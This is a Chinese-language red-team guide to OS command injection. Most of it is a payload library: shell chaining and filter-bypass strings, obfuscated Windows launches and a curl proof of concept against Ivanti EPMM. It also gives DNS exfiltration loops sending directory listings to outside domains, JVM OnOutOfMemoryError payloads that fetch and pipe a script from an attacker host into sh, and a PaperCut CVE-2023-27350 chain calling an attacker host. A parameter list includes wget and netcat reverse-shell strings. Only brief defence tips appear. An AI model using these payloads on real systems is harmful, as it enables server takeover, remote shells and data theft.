# 命令注入（Command Injection）

# 0x01背景与攻击原理
**本质是** 用户输入未经过滤直接拼接至系统命令，导致攻击者操控目标服务器执行任意操作系统命令。核心在于应用程序对用户输入的信任缺失，将数据视为代码执行。

## 1.1 根本原理

- **攻击触发条件**：用户输入被动态拼接到系统命令字符串中（如 `exec("ping " + userInput)`）。
- **关键点**：输入位置决定上下文突破方式：
  - 若输入位于引号内（`"ls ${input}"`），需先闭合引号（`" ; id"`）
  - 若输入位于参数位置（`ping ${input}`），可直接注入操作符（`; id`）
- **影响等级**：**极高**（完全控制服务器环境，可窃取数据、提权、横向移动）

## 1.2 攻击链核心逻辑
```mermaid
graph LR
A[用户输入未过滤] --> B[拼接到系统命令]
B --> C[突破上下文限制]
C --> D[执行恶意命令]
D --> E[数据窃取/系统沦陷]
```

---

# 0x02 攻击向量分类体系

## 2.1 命令链操作符技术矩阵
| 操作符 | 行为逻辑                         | 操作系统 | 风险等级 | 实战关键点                   |
| ------ | -------------------------------- | -------- | -------- | ---------------------------- |
| `||`   | 执行第二条命令（无论前一条结果） | 通用     | 高       | 首选绕过简单过滤             |
| `&&`   | 仅前一条成功时执行第二条         | 通用     | 高       | 适用于依赖前序结果的场景     |
| `;`    | 顺序执行所有命令                 | 通用     | 高       | 部分 WAF 易拦截              |
| `|`    | 管道传递输出至下一命令           | 通用     | 中       | 仅能获取第二条命令输出       |
| `&`    | 后台执行并行命令                 | 通用     | 中       | 仅显示最后一条命令输出       |
| `%0A`  | URL 编码换行符                   | 通用     | **极高** | 绕过空格过滤（**实战首选**） |
| `%09`  | URL 编码制表符                   | 通用     | 高       | 替代空格分隔命令             |

## 2.2 操作系统差异向量

### 2.2.1 Unix / Linux 专属
```bash
`ls`            # 反引号执行
$(ls)           # $() 执行
ls${LS_COLORS:10:1}${IFS}id  # 通过环境变量绕过空格限制
```

### 2.2.2 Windows 专属
```cmd
powershell C:**2\n??e*d.*?     # 模糊路径启动 notepad
@^p^o^w^e^r^s^h^e^l^l c:**32\c*?c.e?e  # 脱敏启动 calc
```

---

# 0x03 核心利用技术深度解析

## 3.1 基础命令链构造（保留原始所有 Payload）

#### 实战标准 Payload 库
```bash
# 通用链式操作（推荐优先测试）
ls||id; ls ||id; ls|| id; ls || id 
ls|id; ls |id; ls| id; ls | id 
ls&&id; ls &&id; ls&& id; ls && id 
ls&id; ls &id; ls& id; ls & id 
ls %0A id 
ls%0abash%09-c%09"id"%0a

# Unix 特有扩展
`ls`
$(ls)
ls; id
> /var/www/html/out.txt  # 尝试重定向输出
< /etc/passwd             # 尝试输入重定向
```

## 3.2 参数/选项注入（无需 Shell 元字符）

**本质是** 利用下游工具解析连字符参数的特性，绕过无 Shell 场景：
- **利用条件**：应用将输入拼接到系统命令且无 Shell 解析（如 `execFile("ping", [userInput])`）
- **攻击链**：
  1. 提供以 `-`/`--` 开头的输入（例：`-n` → 被解析为 `-n` 参数）
  2. 操纵工具行为：
     - `ping -f` → 洪泛攻击（DoS）
     - `curl -o /tmp/x` → 写入任意文件
     - `tcpdump -G 1 -W 1 -z /path/script.sh` → 执行旋转后脚本
- **实战案例**：
  ```http
  POST /cgi-bin/cstecgi.cgi HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  
  topicurl=setEasyMeshAgentCfg&agentName=;id;  # 需 Shell 支持
  topicurl=<handler>&param=-n                  # 无 Shell 攻击
  ```

## 3.3 Bash 算术评估绕过（Ivanti EPMM 案例）

**核心在于** 算术上下文二次解析导致变量名扩展为命令：
- **漏洞链**：
  1. 应用将查询参数映射至全局变量（`st` → `gStartTime`）
  2. 算术比较时二次解析（`[[ $a -gt $b ]]`）
  3. 攻击步骤：
     - `st=theValue` → 使 `gStartTime` 指向变量名 `theValue`
     - `h=gPath['sleep 5']` → 使 `theValue` 包含数组索引
     - 算术比较时触发 `sleep 5`
- **验证 POC**：
  ```bash
  curl -k "https://TARGET/mifs/c/appstore/fob/ANY?st=theValue&h=gPath['sleep 5']"
  ```
  > **实战要点**：
  > - 监测响应延迟（~5s）及状态码（404）
  > - 检查同类路径（如 `/mifs/c/aftstore/fob/`）
  > - **绕过能力**：规避元字符过滤（因算术上下文解析）

---

# 0x04 数据外泄技术体系

## 4.1 时间盲注外泄（字符级提取）

**利用条件**：无直接回显但有时间延迟反馈
```bash
# 提取 whoami 首字符
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi  # 延迟 5s → 字符匹配
time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi  # 无延迟 → 字符不匹配
```
> **风险等级**：中（依赖时间侧信道，速率慢但隐蔽）

## 4.2 DNS 外泄技术（高效无日志）

**操作流程**：
1. 注册 DNS 记录服务（`dnsbin.zhack.ca` 或 `pingb.in`）
2. 构造命令：
   ```bash
   # 提取 / 目录文件列表
   for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
   # 提取 wget 帮助信息
   $(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
   ```
> **关键点**：所有 DNS 请求将显示在外泄平台，避免服务器日志记录

---

# 0x05 防御绕过策略库

## 5.1 Windows 专属绕过
```cmd
powershell C:**2\n??e*d.*?    # 通配符模糊路径
@^p^o^w^e^r^s^h^e^l^l c:**32\c*?c.e?e  # 脱敏执行
```

## 5.2 Linux 限制绕过
- **统一引用策略**：
  ```bash
  # 完整保留原始参考链接（避免重复）
  参见：Linux Bash 限制绕过技术库（../linux-hardening/bypass-bash-restrictions/）
  ```
- **核心绕过点**：
  - 利用 `${IFS}` 替代空格
  - 通过环境变量分段构造命令（`${LS_COLORS:10:1}${IFS}id`）
  - 编码混淆（`%0A` 换行、`%09` 制表符）

---

# 0x06 高级利用案例解析

## 6.1 Node.js `child_process` 风险对比

| 方法         | 执行机制               | 风险等级 | 安全编码方案                                                 |
| ------------ | ---------------------- | -------- | ------------------------------------------------------------ |
| `exec()`     | 调用 `/bin/sh -c`      | **极高** | 禁用，改用 `execFile`                                        |
| `execFile()` | 直接调用二进制无 Shell | 低       | 分离参数为数组：<br>`execFile('/bin/cmd', ['--arg', userInput])` |

**真实漏洞**：Synology Photos ≤ 1.7.0-0794（Pwn2Own 2024）
- 漏洞点：WebSocket 事件将 `id_user` 拼接到 `exec()` 命令
- 攻击链：未授权连接 → 污染 `id_user` → RCE

## 6.2 JVM 诊断回调 RCE（无 Shell 依赖）

**攻击链**：
1. 通过注入 JVM 参数触发 OOM（如 `-XX:MaxMetaspaceSize=16m`）
2. 绑定错误回调命令：`-XX:OnOutOfMemoryError="cmd"`
3. **无需 Shell**：命令由 JVM 直接调用（绕过元字符过滤）
**POC 示例**：
```bash
# Linux 反弹 Shell
-XX:MaxMetaspaceSize=12m -XX:OnOutOfMemoryError="/bin/sh -c 'curl -fsS https://attacker/p.sh | sh'"

# Windows 提权
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand <blob>"
```
> **实战价值**：桌面应用 IPC 漏洞→OS 命令执行（如 Localhost WebSocket 滥用）

## 6.3 PaperCut NG/MF 打印脚本 RCE（CVE-2023-27350）

**完整攻击链**：
1. **认证绕过**：访问 `/app?service=page/SetupCompleted` 获取 `JSESSIONID`
2. **配置启用**：
   - `print-and-device.script.enabled=Y`
   - `print.script.sandboxed=N`
3. **执行 Payload**（直接触发无需打印任务）：
   ```js
   function printJobHook(inputs, actions) {}
   cmd = ["bash","-c","curl http://attacker/hit"];
   java.lang.Runtime.getRuntime().exec(cmd);
   ```
4. **自动化工具**：[CVE-2023-27350.py](https://github.com/horizon3ai/CVE-2023-27350)（支持内网代理穿透）

---

# 0x07 高危参数检测清单

**攻击面扫描必备参数列表**（基于 25 个高频漏洞参数）：

| 参数名         | 风险等级 | 典型利用方式             | 检测建议                                                     |
| -------------- | -------- | ------------------------ | ------------------------------------------------------------ |
| `cmd`          | 高       | `?cmd=id`                | 优先测试                                                     |
| `exec`         | 高       | `?exec=cat /etc/passwd`  | 结合盲注技术                                                 |
| `command`      | 高       | `?command=wget+evil.com` | 需绕过空格过滤                                               |
| `ping`         | 中       | `?ping=127.0.0.1%0Aid`   | 测试连字符注入                                               |
| `code`         | 高       | `?code=system(%22id%22)` | 需注意编码场景                                               |
| `payload`      | 中       | `?payload=;nc+e+/bin/sh` | 警惕二次编码绕过                                             |
| **其他 20 项** | 中-高    | 参考完整列表 →           | [完整字典](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt) |

> **扫描策略**：使用 `command_injection.txt` 字典进行暴力探测（优先测试 `ping`、`exec` 类参数）

---

# 0x08 实战关键结论

## 7.1 核心要点

1. **攻击优先级**：
   - 首选 `%0A` 换行符绕过空格限制（成功率 >90%）
   - 针对 Java 应用优先测试 JVM 参数注入
   - 网络设备关注 `topicurl` 类参数（如 TOTOLINK CVE 案例）

2. **绕过关键逻辑**：
   - **本质是** 利用解析器差异：
     - Shell vs 应用层解析差异
     - 编码解码层级错位（如 URL 解码后拼接命令）
   - **成功率最高的技巧**：`%0A` + 模糊路径（Windows） / `${IFS}`（Linux）

3. **风险规避建议**：
   - 避免使用 `exec()` 直接拼接输入（Node.js/PHP）
   - 严格白名单参数过滤（禁止 `-` 开头输入）
   - 沙箱化执行环境（如 PaperCut 的 `print.script.sandboxed=Y`）

### 7.1.1 一句话红队结论
> **命令注入的攻防本质是解析权争夺战——攻击者通过构造"合法输入"触发解析器降级执行，而防御关键在于输入上下文的绝对隔离。实战中，90% 的漏洞源于对参数边界的信任缺失，而非过滤规则的不足。**

---

## 附录：参考资源

- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [PortSwigger OS 命令注入指南](https://portswigger.net/web-security/os-command-injection)
- [Synology Photos RCE 分析（Pwn2Own 2024）](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [Ivanti RewriteMap RCE 细节（CVE-2026-1281）](https://unit42.paloaltonetworks.com/ivanti-cve-2026-1281-cve-2026-1340/)
- [PaperCut NG/MF 自动化攻击脚本](https://github.com/horizon3ai/CVE-2023-27350)
- [Linux Bash 绕过限制技术库](../linux-hardening/bypass-bash-restrictions/)
- [命令注入暴力检测字典](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt)